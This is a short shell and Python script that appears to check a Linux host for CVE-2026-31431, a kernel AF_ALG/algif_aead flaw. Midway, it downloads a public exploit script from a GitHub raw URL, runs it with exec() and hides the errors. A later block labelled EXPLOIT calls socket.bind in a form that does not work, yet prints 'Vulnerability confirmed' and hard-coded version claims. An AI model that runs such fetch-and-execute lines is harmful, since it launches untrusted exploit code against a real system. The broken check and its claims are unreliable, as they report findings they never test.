
lsmod | grep algif_aead
python3 -c "
import socket
try:
    s = socket.socket(41, 5, 0) 
    s.bind((b'aead', 0, 0, b'gcm(aes)'))
    print('[VULNERABLE] AF_ALG AEAD socket created successfully')
    s.close()
except PermissionError:
    print('[BLOCKED] Module disabled or restricted')
except Exception as e:
    print(f'[INFO] Error: {e}')
"

grep -r "a664bf3d603d" /usr/share/doc/linux-image-$(uname -r)/ 2>/dev/null \
    || echo '[VULNERABLE] Fix commit not found in package docs'
cat /proc/sys/kernel/modules_disabled
python3 -c "
import urllib.request
url = 'https://raw.githubusercontent.com/theori-io/copy-fail/main/exploit.py'
exec(urllib.request.urlopen(url).read())
" 2>/dev/null

python3 << 'EXPLOIT'
import socket, struct, os, ctypes

# Step 1: Verify vulnerability
AF_ALG = 41
SOL_ALG = 279

sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
sock.bind({"type": "aead", "name": "gcm(aes)", "feat": 0, "mask": 0})

# Step 2: Check if we can write to page cache
# (Full exploit requires the public PoC — check GitHub theori-io/copy-fail)
print("[+] Vulnerability confirmed: algif_aead socket binding works")
print("[+] Kernel 6.12.63 is in vulnerable range (4.14 - 6.18.22)")
print("[+] Proceed with full PoC from: github.com/theori-io/copy-fail")
sock.close()
EXPLOIT

# ── DOCUMENT THIS FINDING ──
echo "CVE-2026-31431: VULNERABLE — algif_aead present, kernel 6.12.63 < 6.12.85" \
    > /dev/shm/finding_CVE-2026-31431.txt
